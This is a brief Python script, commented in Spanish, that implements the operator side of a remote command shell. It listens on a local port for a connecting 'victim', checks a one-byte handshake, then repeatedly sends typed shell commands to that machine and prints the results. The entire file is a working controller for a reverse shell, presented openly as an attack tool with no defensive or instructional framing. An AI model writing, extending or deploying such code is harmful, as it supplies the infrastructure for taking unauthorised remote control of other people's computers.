import socket 

def main():
    server = socket.socket()
    server.bind(('localhost', 7777))
    server.listen(1) # Servidor que solo acepta 1 única conexión de clientes potenciales

    while True:
        victima, direccion = server.accept()
        print(f'Conexión de: {direccion}')

        ver = victima.recv(1024)
        receiving_object = bytes("1", encoding='utf-8')

        if ver == receiving_object: # Mensaje que debe enviar nuestro cliente para entablar la conexión de manera satisfactoria
            while True:
                opcion = bytes(input("shell@shell: "), encoding='utf-8')
                print(f'Content Object to send: {opcion}')
                victima.send(opcion)

                # Recibe respuesta del cliente
                resultado = victima.recv(4096)  # Buffer más grande
                print(resultado.decode())  # Decodifica y muestra el resultado

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()